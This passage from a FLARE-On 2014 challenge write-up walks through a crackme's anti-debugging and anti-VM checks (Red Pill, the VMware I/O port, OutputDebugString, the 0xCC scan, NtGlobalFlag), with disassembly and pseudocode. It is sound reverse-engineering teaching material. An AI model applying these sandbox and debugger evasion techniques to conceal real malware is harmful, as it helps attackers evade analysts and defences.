<span style="color: #93A1A1">.text:0040114</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0FF000000h</span>              <span style="color: #586E75">; Comparing the first byte with 0xFF</span>
<span style="color: #93A1A1">.text:00401153</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_40119A</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The above compares the first byte of IDT address with <code>0xFF</code>. According to our table it is looking for <code>VMware</code>. But we are not running it. If this check passes (meaning we are not running VMware) the string <code>you're so bad</code> is going to be xor-ed with the blob, otherwise it will be <code>you're so good</code>. The address <code>0xBAB3C590</code> did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>VMware Detection via Red Pill</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(running_in_vmware):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;you&#39;re so good&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;you&#39;re so bad&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-4-vmware-detection-2-electric-boogaloo:94bf06dd1bee42f6b34a1ff79274f7e7">Function 4 - VMware Detection 2: Electric Boogaloo</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4011D0</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4012A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>What&rsquo;s in the box?</p>

<p><img src="/images/2014/flare/7-8.jpg" alt="VMware detection 2" title="VMware detection 2" /></p>

<p>Function will create its own exception handler, it will return the execution to <code>loc_401232</code> if an exception occurs. Then we have some interesting instructions. If we look at the <a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/" target="_blank">Malware Bytes</a> article, it is named <code>VMware I/O port</code>. These are the magic instructions:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>VMware I/O port check</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:0040120</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">564D5868h</span>   <span style="color: #586E75">; save magic number to eax</span>
<span style="color: #93A1A1">.text:00401213</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ah</span>
<span style="color: #93A1A1">.text:00401218</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">dx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5658h</span>
<span style="color: #93A1A1">.text:0040121</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">in</span>      <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">dx</span>          <span style="color: #586E75">; if in VMware, this instruction will save the magic number in ebx</span>
<span style="color: #93A1A1">.text:0040121</span><span style="color: #268BD2">D</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_1C</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">ebx</span>    <span style="color: #586E75">; executes if in VMware otherwise exception</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>It&rsquo;s a quick way to find if the application is running in a VMware VM. If <code>in eax, dx</code> is successful, it will save the magic number in <code>ebx</code> and then <code>var_1C</code>. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then <code>var_1C</code> is compared to the magic number to determine if the application is in a VMware VM or not.</p>

<p>I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.</p>

<p><img src="/images/2014/flare/7-9.jpg" alt="VMware detection 2 continued" title=" VMware detection 2 continued" /></p>

<p>The rest of the function is pretty simple, if the check fails <code>0x66</code> (character <code>f</code>) will be xor-ed with the blob. If running in VMware <code>0x01</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>VMWare Detection 2</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(running_in_vmware):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">0x01</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">0x66</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-5-outputdebugstring:94bf06dd1bee42f6b34a1ff79274f7e7">Function 5 - OutputDebugString</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4012A0</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-10.jpg" alt="OutputDebugString" title="OutputDebugString" /></p>

<p>This is almost the same as listing 16-1 in page 353 of <code>Practical Malware Analysis</code> book (<a href="http://books.google.com/books?id=FQC8EPYy834C&amp;pg=PA353&amp;dq=outputdebugstring&amp;hl=en&amp;sa=X&amp;ei=lcksVI7JM9bGsQSdpoGACA&amp;ved=0CDsQ6AEwBQ#v=onepage&amp;q=outputdebugstring&amp;f=false" target="_blank">Link to p.353 on Google Books</a>). First the current error code is set to <code>0x1234</code>. Then <code>OutputDebugString</code> is called with string <code>bah!</code>. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains <code>0x1234</code>. Later, last error code is retrieved by calling <code>GetLastError</code>, if this value is not changed then a debugger is attached to the application and string <code>Sandboxes are fun to play in</code> is xor-ed with blob. In the absence of a debugger, <code>I'm gonna sandbox your face</code> is used.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>OutputDebugString</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #268BD2">if</span><span style="color: #93A1A1">(</span><span style="color: #268BD2">debugger_is_attached</span><span style="color: #93A1A1">):</span>
    <span style="color: #268BD2">blob</span> <span style="color: #93A1A1">=</span> <span style="color: #268BD2">xor</span><span style="color: #93A1A1">(</span><span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">&quot;Sandboxes are fun to play in&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">else:</span>
    <span style="color: #268BD2">blob</span> <span style="color: #93A1A1">=</span> <span style="color: #268BD2">xor</span><span style="color: #93A1A1">(</span><span style="color: #B58900">bl</span><span style="color: #268BD2">ob</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;I&#39;m gonna sandbox your face&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-6-i-can-haz-breakpoint:94bf06dd1bee42f6b34a1ff79274f7e7">Function 6 - I Can Haz Breakpoint?</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-11.jpg" alt="0xCC Check" title="0xCC Check" /></p>

<p>Offsets from two functions are loaded and then compared. The first one calls <code>isDebuggerPresent</code> and the second one just prints something and exits. We have seen this function before, it is the first check.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>calls_isDebuggerPresent</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">01030</span> <span style="color: #268BD2">calls_isDebuggerPresent</span> <span style="color: #268BD2">proc</span> <span style="color: #268BD2">near</span>
<span style="color: #93A1A1">.text:00401030</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">esi</span>
<span style="color: #93A1A1">.text:00401031</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">IsDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401037</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">bl</span><span style="color: #268BD2">ob_length</span>
<span style="color: #93A1A1">.text:0040103</span><span style="color: #268BD2">D</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:0040103</span><span style="color: #268BD2">F</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401041</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_401079</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>sub_401780</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401780</span> <span style="color: #268BD2">sub_401780</span> <span style="color: #268BD2">proc</span> <span style="color: #268BD2">near</span>
<span style="color: #93A1A1">.text:00401780</span>
<span style="color: #93A1A1">.text:00401780</span> <span style="color: #268BD2">arg_0</span><span style="color: #93A1A1">=</span> <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span>  <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:00401780</span>
<span style="color: #93A1A1">.text:00401780</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:00401781</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">esp</span>
<span style="color: #93A1A1">.text:00401783</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">arg_0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401786</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:00401787</span> <span style="color: #268BD2">push</span>    <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aBmoChopD</span> <span style="color: #586E75">; &quot;BMO Chop! [%d]\n&quot;</span>
<span style="color: #93A1A1">.text:0040178</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_printf</span>
<span style="color: #93A1A1">.text:00401791</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:00401794</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0FFFFDCD7h</span>      <span style="color: #586E75">; uExitCode</span>
<span style="color: #93A1A1">.text:00401799</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">ExitProcess</span>
<span style="color: #93A1A1">.text:00401799</span> <span style="color: #268BD2">sub_401780</span> <span style="color: #268BD2">endp</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>None of these functions are called. But their offsets are compared. If offset of <code>calls_isDebuggerPresent</code> is larger than <code>sub_401780</code> then we jump down and string <code>I can haz decode?</code> is xor-ed with the blob. Otherwise we go right. <strong>I am not quite sure what this check is for</strong>. I think it is trying to find if calls to <code>isDebuggerPresent</code> are redirected or not (by the debugger?) as the address of the first function is <code>0x401030</code> and is smaller than <code>0x401780</code>. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.</p>

<p>To the right we can see a pretty standard <code>0xCC</code> check. <code>0xCC</code> is the code for <code>INT 3</code> and is used by debuggers to set breakpoints. It is simply checking if <code>0xCC</code> bytes are present in the function code. If <code>0xCC</code> is present <code>ecx</code> is increased by 2, otherwise by one. In the end this number is compared with <code>0x55</code>. If the check does not pass it will jump to left (same as above) and <code>I can haz decode?</code> is xor-ed with the blob. If the number is <code>0x55</code> string <code>Such fire. Much burn. Wow.</code> is xor-ed with the blob.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>ICanHaz?</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(calls_isDebuggerPresent</span><span style="color: #719e07">.</span><span style="color: #93A1A1">address</span> <span style="color: #719e07">&gt;</span> <span style="color: #93A1A1">sub_401780</span><span style="color: #719e07">.</span><span style="color: #93A1A1">address)</span> <span style="color: #719e07">or</span> <span style="color: #93A1A1">(calls_isDebuggerPresent</span><span style="color: #719e07">.</span><span style="color: #93A1A1">has0xCC</span> <span style="color: #719e07">==</span> <span style="color: #268BD2">True</span> <span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;I can haz decode?&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;Such fire. Much burn. Wow.&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-7-ntglobalflag:94bf06dd1bee42f6b34a1ff79274f7e7">Function 7 - NtGlobalFlag</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">ICanHaz?</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This one is pretty straightforward. A field inside the <code>PEB</code> (we have already seen it) is called <code>NtGlobalFlag</code>. This flag is at offset <code>0x68</code> in 32-bit versions of Windows (and <code>0xBC</code> for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to <code>0x70</code>. To read more about it, please look at the <a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank">Anti-Debugging</a> reference.</p>

<p><img src="/images/2014/flare/7-12.jpg" alt="&quot;NtGlobalFlag Checked&quot;" title="NtGlobalFlag Checked" /></p>

<p>If <code>NtGlobalFlag</code> is not <code>0x70</code> then <code>\x09\x00\x00\x01</code> will be xor-ed with the blob, otherwise <code>Feel the sting of the monarch!</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>NtGlobalFlag</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(NtGlobalFlag</span> <span style="color: #719e07">==</span> <span style="color: #2AA198">0x70</span><span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;Feel the sting of the monarch!&quot;</span><span style="color: #93A1A1">)</span>
    
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\x09\x00\x00\x01</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-8-sands-of-time:94bf06dd1bee42f6b34a1ff79274f7e7">Function 8 - Sands of Time</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">ICanHaz?</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">NtGlobalFlag</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>     <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-13.jpg" alt="Checking day of the week" title="Checking day of the week" /></p>

<p>This is not a countermeasure but a simple check. First <code>time64</code> is called and returns the number of seconds since January 1st 1970. Then <code>localtime64</code> converts it to <a href="http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx" target="_blank">readabled format</a> stored in a structure of type <code>tm</code> according to MSDN:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>tm</span>
  </figcaption>
  <div class="codewrapper"> 
